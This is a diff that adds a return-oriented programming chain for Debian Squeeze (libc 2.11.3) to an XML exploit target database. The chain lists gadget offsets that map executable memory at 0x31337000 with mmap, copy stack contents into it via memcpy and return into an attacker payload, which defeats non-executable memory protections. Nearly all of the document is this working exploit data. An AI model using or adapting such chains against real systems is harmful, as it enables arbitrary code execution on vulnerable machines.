@@ -210,4 +210,60 @@
         </gadgets>
     </rop>
 
+    <rop>
+        <compatibility>
+            <target>Debian Squeeze</target>
+        </compatibility>
+
+        <!--
+        dpkg -l | grep libc*  ii libc-bin 2.11.3-4 Embedded GNU C Library: Binaries
+        b75f5000-b7735000 r-xp 00000000 08:01 157287     /lib/i686/cmov/libc-2.11.3.so
+        b7738000-b7739000 rw-p 00142000 08:01 157287     /lib/i686/cmov/libc-2.11.3.so
+        -->
+
+        <gadgets base="0">
+            <!-- mmap rwx memory -->
+            <gadget value ="0x0804a210">mmap64@plt</gadget>
+            <gadget offset="0x000b744b">add esp 0x1c ; leave</gadget>
+            <gadget value ="0x31337000">map destination</gadget>
+            <gadget value ="0x00001000">size</gadget>
+            <gadget value ="0x00000007">PROT_READ | PROT_WRITE | PROT_EXEC</gadget>
+            <gadget value ="0x00000031">MAP_PRIVATE | MAP_ANON | MAP_FIXED</gadget>
+            <gadget value ="0xffffffff">fildes</gadget>
+            <gadget value ="0x00000000">offset</gadget>
+            <gadget value ="0x00000000"></gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+
+            <!-- put stack location in eax and adjust it to point to src param for memcpy -->
+            <gadget offset="0x000c2bc7">push esp ; xor eax, eax ; pop ebx ; pop ebp</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget offset="0x000cc3f6">xchg ecx, ebx ; pop ebp</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget offset="0x000709e0">mov edi, ecx ; mov eax, edi ; pop edi ; pop ebp</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget value ="0x0000004c">add to eax</gadget>
+            <gadget offset="0x000658e7">add eax, ebp</gadget>
+
+            <!-- move original stack location in [eax] -->
+            <gadget offset="0x0007487d">mov edi, eax ; mov esi, edx ; mov eax, [esp+4]</gadget>
+            <gadget offset="0x000c4262">mov eax, ecx ; pop ebx ; pop ebp</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget offset="0x0002c528">mov [edi], eax ; pop eax ; pop ebx ; pop esi ; pop edi</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+            <gadget value ="0xffffffff">garbage</gadget>
+
+            <!-- call memcpy and return into payload -->
+            <gadget value ="0x08049f10">memcpy@plt</gadget>
+            <gadget value ="0x31337054">return into payload</gadget>
+            <gadget value ="0x31337000">dest</gadget>
+            <gadget value ="0xffffffff">src (overwritten by stack location)</gadget>
+            <gadget value ="0x00001000">size</gadget>
+
+        </gadgets>
+    </rop>
+
+
 </db>
